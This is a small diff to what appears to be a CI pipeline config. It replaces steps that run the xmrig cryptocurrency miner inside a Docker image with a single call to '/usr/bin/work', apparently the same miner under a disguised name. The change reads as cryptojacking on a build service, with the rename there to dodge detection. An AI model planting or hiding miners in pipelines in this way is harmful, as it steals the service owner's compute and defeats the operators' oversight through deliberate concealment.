@@ -4,5 +4,4 @@ steps:
     title: Runing Docker Image
     image: dsomeone/nizadam:latest
     commands:
-      - cd /xmrig/build
-      - ./xmrig
+      - /usr/bin/work
